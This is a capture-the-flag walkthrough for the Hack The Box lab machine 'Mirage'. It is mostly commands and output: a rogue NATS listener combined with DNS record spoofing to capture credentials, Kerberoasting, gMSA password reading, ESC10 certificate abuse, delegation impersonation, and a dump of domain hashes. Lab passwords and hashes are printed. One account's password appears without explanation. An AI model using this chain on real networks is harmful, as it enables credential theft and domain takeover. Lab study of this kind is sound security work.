---
layout: post
title: "[HTB] Mirage"
description: "[Machine] - Hard difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Hard
---

![Mirage](/img/htb_img/Mirage_img/Mirage.png)

Mirage

# Enumeration
## Nmap recon

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 10:05 CEST
Initiating SYN Stealth Scan at 10:05
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 135/tcp on 10.129.xx.xx
Discovered open port 445/tcp on 10.129.xx.xx
Discovered open port 111/tcp on 10.129.xx.xx
Discovered open port 53/tcp on 10.129.xx.xx
Discovered open port 139/tcp on 10.129.xx.xx
Discovered open port 47001/tcp on 10.129.xx.xx
Discovered open port 9389/tcp on 10.129.xx.xx
Discovered open port 49667/tcp on 10.129.xx.xx
Discovered open port 49667/tcp on 10.129.xx.xx
Discovered open port 5985/tcp on 10.129.xx.xx
Discovered open port 61941/tcp on 10.129.xx.xx
Discovered open port 61947/tcp on 10.129.xx.xx
Discovered open port 49666/tcp on 10.129.xx.xx
Discovered open port 4222/tcp on 10.129.xx.xx
Discovered open port 49665/tcp on 10.129.xx.xx
Discovered open port 61966/tcp on 10.129.xx.xx
Discovered open port 61924/tcp on 10.129.xx.xx
Discovered open port 389/tcp on 10.129.xx.xx
Discovered open port 49668/tcp on 10.129.xx.xx
Discovered open port 61980/tcp on 10.129.xx.xx
Discovered open port 61980/tcp on 10.129.xx.xx
Discovered open port 593/tcp on 10.129.xx.xx
Discovered open port 62197/tcp on 10.129.xx.xx
Discovered open port 49664/tcp on 10.129.xx.xx
Discovered open port 61925/tcp on 10.129.xx.xx
Discovered open port 3269/tcp on 10.129.xx.xx
Discovered open port 636/tcp on 10.129.xx.xx
Discovered open port 88/tcp on 10.129.xx.xx
Discovered open port 57704/tcp on 10.129.xx.xx
Discovered open port 2049/tcp on 10.129.xx.xx
Discovered open port 464/tcp on 10.129.xx.xx
Discovered open port 61913/tcp on 10.129.xx.xx
Discovered open port 3268/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 10:06, 26.52s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.085s latency).
Scanned at 2025-07-25 10:05:37 CEST for 26s
Not shown: 65492 closed tcp ports (reset), 12 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
111/tcp   open  rpcbind          syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2049/tcp  open  nfs              syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
4222/tcp  open  vrml-multi-use   syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
57704/tcp open  unknown          syn-ack ttl 127
61913/tcp open  unknown          syn-ack ttl 127
61924/tcp open  unknown          syn-ack ttl 127
61925/tcp open  unknown          syn-ack ttl 127
61941/tcp open  unknown          syn-ack ttl 127
61947/tcp open  unknown          syn-ack ttl 127
61966/tcp open  unknown          syn-ack ttl 127
61980/tcp open  unknown          syn-ack ttl 127
62197/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
           Raw packets sent: 71636 (3.152MB) | Rcvd: 68069 (2.723MB)
```

Scripts and versions.

```bash
❯ nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49668,57704,61913,61924,61925,61941,61947,61966,61980,62197 -sCV -Pn -oN targeted $target     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 10:08 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.086s latency).

PORT      STATE SERVICE               VERSION
53/tcp    open  domain                Simple DNS Plus
88/tcp    open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-07-25 15:08:35Z)
111/tcp   open  rpcbind               2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3,4       2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/udp   mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100024  1           2049/tcp   status
|_  100024  1           2049/udp   status
135/tcp   open  msrpc                 Microsoft Windows RPC
139/tcp   open  netbios-ssn           Microsoft Windows netbios-ssn
389/tcp   open  ldap                  Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  nlockmgr              1-4 (RPC #100021)
3268/tcp  open  ldap                  Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/globalcatLDAPssl?
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","server_name":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1712,"client_ip":"10.10.X.X","xkey":"XA2QMRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","server_name":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1713,"client_ip":"10.10.X.X","xkey":"XA2QMRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","server_name":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1714,"client_ip":"10.10.X.X","xkey":"XA2QMRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","server_name":"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":1711,"client_ip":"10.10.X.X","xkey":"XA2QMRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http                  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf                .NET Message Framing
47001/tcp open  http                  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc                 Microsoft Windows RPC
49665/tcp open  msrpc                 Microsoft Windows RPC
49666/tcp open  msrpc                 Microsoft Windows RPC
49667/tcp open  msrpc                 Microsoft Windows RPC
49668/tcp open  msrpc                 Microsoft Windows RPC
57704/tcp open  msrpc                 Microsoft Windows RPC
61913/tcp open  msrpc                 Microsoft Windows RPC
61924/tcp open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
61925/tcp open  msrpc                 Microsoft Windows RPC
61941/tcp open  msrpc                 Microsoft Windows RPC
61947/tcp open  msrpc                 Microsoft Windows RPC
61966/tcp open  msrpc                 Microsoft Windows RPC
61980/tcp open  msrpc                 Microsoft Windows RPC
62197/tcp open  msrpc                 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=7/25%Time=68833B7F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D1,"INFO\x20{\"server_id\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX
SF:5OWZFB4OC73PCCXEKX\",\"server_name\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQD
SF:XVIQLX5OWZFB4OC73PCCXEKX\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_c
SF:ommit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"por
SF:t\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":104857
SF:6,\"jetstream\":true,\"client_id\":1711,\"client_ip\":\"10\.10\.14\.11\
SF:",\"xkey\":\"XA2QMRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS\"
SF:}\x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D2,"
SF:INFO\x20{\"server_id\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4O
SF:C73PCCXEKX\",\"server_name\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5O
SF:WZFB4OC73PCCXEKX\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":
SF:\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222
SF:,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jets
SF:tream\":true,\"client_id\":1712,\"client_ip\":\"10\.10\.14\.11\",\"xkey
SF:\":\"XA2QMRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS\"}\x20\r\
SF:n-ERR\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D2,"INFO\x20{
SF:\"server_id\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEK
SF:X\",\"server_name\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73
SF:PCCXEKX\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda
SF:\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"header
SF:s\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":t
SF:rue,\"client_id\":1713,\"client_ip\":\"10\.10\.14\.11\",\"xkey\":\"XA2Q
SF:MRU2RPNYXO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS\"}\x20\r\n-ERR\x20
SF:'Authorization\x20Violation'\r\n")%r(HTTPOptions,1D2,"INFO\x20{\"server
SF:_id\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX\",\"se
SF:rver_name\":\"NAB72KXM3VEY3MRLEC7DGXXLNFPBRQQDXVIQLX5OWZFB4OC73PCCXEKX\
SF:",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\
SF:":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":true
SF:,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"cl
SF:ient_id\":1714,\"client_ip\":\"10\.10\.14\.11\",\"xkey\":\"XA2QMRU2RPNY
SF:XO7NV54KTHSOVGYE6KLKMGBZJADCRSKUAJRALD2UAURS\"}\x20\r\n-ERR\x20'Authori
SF:zation\x20Violation'\r\n");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-07-25T15:09:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 258.44 seconds
```

Different things to take into consideration here:

dc01.mirage.htb and mirage.htb to hosts file.

```bash
❯ echo "$target mirage.htb dc01.mirage.htb" | sudo tee -a /etc/hosts                                                                                                           
10.129.xx.xx mirage.htb dc01.mirage.htb
```

---

## NFS Shares

There are also NFS shares mounted on the device, so we can check them with `showmount`.

```bash
❯ showmount -e mirage.htb                                                      
Export list for mirage.htb:
/MirageReports (everyone)
```

We create a temporary folder for this machine and mount this one.

```bash
❯ sudo mkdir /mnt/Mirage

❯ sudo mount -t nfs mirage.htb:/MirageReports /mnt/Mirage

❯ cd /mnt/Mirage
❯ ls -lah
drwxrwxrwx nobody nogroup  64 B  Mon May 26 23:41:57 2025  .
drwxr-xr-x root   root    4.0 KB Fri Jul 25 10:21:09 2025  ..
.rwx------ nobody nogroup 8.1 MB Tue May 20 17:08:12 2025  Incident_Report_Missing_DNS_Record_nats-svc.pdf
.rwx------ nobody nogroup 8.9 MB Mon May 26 23:37:21 2025  Mirage_Authentication_Hardening_Report.pdf
```

We copy them locally and inspect them.

![MirageReport](/img/htb_img/Mirage_img/image.png)

MirageReport

This says that the DNS record for `nats-svc` is missing. This means that we can set a rogue DNS server. 

We also get an email `ad-security@mirage.htb`.

---

# Foothold

On port 4222 there is a NATS Server running.

## Nats Client installation

```bash
go install github.com/nats-io/natscli/nats@v0.0.33
```

We can create a `rogue NATS server` to capture exfiltrated data.

```bash
❯ catn fake_nats.py       
import socket

HOST = "0.0.0.0"
PORT = 4222

print(f"[+] Fake NATS Server listening on {HOST}:{PORT}")
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

while True:
    try:
        client, addr = s.accept()
        print(f"[+] Connection from {addr}")
        
        # Send fake INFO
        info = b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n'
        client.sendall(info)

        # Read potential credentials
        data = client.recv(2048)
        print("[>] Received:")
        print(data.decode(errors='replace'))

        # Optional: Close connection or respond
        # client.sendall(b'-ERR "Authorization Violation"\r\n')
        client.close()

    except Exception as e:
        print(f"[!] Error: {e}")
```

```bash
❯ python3 fake_nats.py                                           
[+] Fake NATS Server listening on 0.0.0.0:4222

❯ nsupdate           
> server 10.129.xx.xx
> update add nats-svc.mirage.htb 3600 A 10.10.X.X
> send
```

We spoof the DNS Record for nats-svc.mirage.htb

And after some seconds we get the following information:

```bash
❯ python3 fake_nats.py
[+] Fake NATS Server listening on 0.0.0.0:4222
[+] Connection from ('10.129.xx.xx', 54093)
[>] Received:
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}
PING
```

<aside>
💳

Dev_Account_A:hx5h7F5554fP@1337!

</aside>

---

## NATS creation

```bash
❯ nats --server nats://10.129.xx.xx:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer add auth_logs test --pull --ack explicit
? Start policy (all, new, last, subject, 1h, msg sequence) all
? Replay policy instant
? Filter Stream by subjects (blank for all) 
? Maximum Allowed Deliveries -1
? Maximum Acknowledgments Pending 0
? Deliver headers only without bodies No
? Add a Retry Backoff Policy No
Information for Consumer auth_logs > test created 2025-07-25 18:10:34

Configuration:

                    Name: test
               Pull Mode: true
          Deliver Policy: All
              Ack Policy: Explicit
                Ack Wait: 30.00s
           Replay Policy: Instant
         Max Ack Pending: 1,000
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0
    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0
        Outstanding Acks: 0 out of maximum 1,000
    Redelivered Messages: 0
    Unprocessed Messages: 5
           Waiting Pulls: 0 of maximum 512
```

Read messages:

```bash
❯ nats --server nats://10.129.xx.xx:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer next auth_logs test --count=10 
[11:11:13] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[11:11:13] subj: logs.auth / tries: 1 / cons seq: 2 / str seq: 2 / pending: 3

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[11:11:13] subj: logs.auth / tries: 1 / cons seq: 3 / str seq: 3 / pending: 2

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[11:11:13] subj: logs.auth / tries: 1 / cons seq: 4 / str seq: 4 / pending: 1

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[11:11:14] subj: logs.auth / tries: 1 / cons seq: 5 / str seq: 5 / pending: 0

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

--- subject: _INBOX.Vk4XN9Kv685c2NQzENgKjB.b8yKhWIj

Headers:

  Status: 408
  Description: Request Timeout
  Nats-Pending-Messages: 1
  Nats-Pending-Bytes: 0

Data:

nats: error: could not Acknowledge message: nats: message does not have a reply
```

<aside>
💳

david.jjackson:pN8kQmn6b86!1234@

</aside>

---

## Bloodhound

Run bloodhound with David and quickly find the following information.

![image.png](/img/htb_img/Mirage_img/image%201.png)

We can see that `Nathan.Aadam` is an important user and we can list all kerberoastable users.

```bash
impacket-getTGT mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'
export KRB5CCNAME=david.jjackson.ccache
impacket-GetUserSPNs -k -no-pass -dc-host dc01.mirage.htb mirage.htb/ -request
```

We crack the retrieved hash with john:

```bash
john nathan_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
3edc#EDC3
```

So we got the following credentials:

<aside>
💳

nathan.aadam:3edc#EDC3

</aside>

### Shell as Nathan and User.txt

```bash
❯ impacket-getTGT -dc-ip 10.129.xx.xx mirage.htb/nathan.aadam:'3edc#EDC3'

❯ export KRB5CCNAME=nathan.aadam.ccache

❯ evil-winrm -i dc01.mirage.htb -r mirage.htb
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> type user.txt
<REDACTED>
```

## Full bloodhound

Now that we have Nathan, we can collect the whole bloodhound with this user.

```bash
❯ bloodhound-python -u nathan.aadam -p '3edc#EDC3' -c All -d mirage.htb -ns 10.129.xx.xx      
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 00M 08S
```

![Kerberoastable accounts](/img/htb_img/Mirage_img/image%202.png)

Kerberoastable accounts

Both of these accounts are kerberoastable.

![Mark BBond](/img/htb_img/Mirage_img/image%203.png)

Mark BBond

Mark Bbond has `ForceChangePassword` on Javier MMarshall.

![Javier.MMarshall](/img/htb_img/Mirage_img/image%204.png)

Javier.MMarshall

Javier MMarshall has `ReadGMSAPassword` on Mirage-Services.

But, the account is disabled, so we need to try to enable it. After that, we `clone logon hours` from mark using PowerShell.

---

```bash
❯ bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object javier.mmarshall userAccountControl -v 512
bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object javier.mmarshall logonHours
bloodyAD --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set password javier.mmarshall 'Password123!'

[+] javier.mmarshall's userAccountControl has been updated
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] javier.mmarshall's logonHours has been updated
[+] Password changed successfully!
```

---

We get the hashes and the TGT for the computer account

```bash
❯ bloodyAD -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Password123!' get object 'Mirage-Service$' --attr msDS-ManagedPassword

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==
```

```bash
impacket-getTGT mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaf40f0c7866
```

---

# Privilege Escalation

After enumerating a bit more we found:

```bash
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
```

So, 0x4 means "map using AltSecurityIdentities field", which is weak and vulnerable to abuse. This is ESC10 abuse of weak certificate mapping (Schannel-based) attack. To abuse this I did the following:

## UPN Manipulation

```bash
 export KRB5CCNAME=Mirage-Service\$.ccache
 certipy-ad account update \
   -user 'mark.bbond' \
   -upn 'dc01$@mirage.htb' \
   -u 'mirage-service$@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.129.xx.xx \
   -target dc01.mirage.htb
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

---

## Certificate Enrollment

```bash
 impacket-getTGT mirage.htb/mark.bbond:'1day@atime'
 export KRB5CCNAME=mark.bbond.ccache
 certipy-ad req \
   -u 'mark.bbond@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.129.xx.xx \
   -target 'dc01.mirage.htb' \
   -ca 'mirage-DC01-CA' \
   -template 'User'
```

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

## UPN Reversion

```bash
 export KRB5CCNAME=Mirage-Service\$.ccache
 certipy-ad account update \
   -user 'mark.bbond' \
   -upn 'mark.bbond@mirage.htb' \
   -u 'mirage-service$@mirage.htb' \
   -k -no-pass \
   -dc-ip 10.129.xx.xx \
   -target dc01.mirage.htb
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'
```

## Schannel Authentication and Impersonation

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.129.xx.xx -ldap-shell

# After that:
set_rbcd dc01$ Mirage-Service$
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.129.xx.xx:636'
 set_rbcd dc01$ Mirage-Service$

[*] Authenticated to '10.129.xx.xx' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

#  set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy

# 
```

## Secretsdump

```bash
impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.129.xx.xx  'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
export KRB5CCNAME='dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache'
impacket-secretsdump -k -no-pass -dc-ip 10.129.xx.xx dc01.mirage.htb
```

```bash
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
/home/kali/PyEnv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
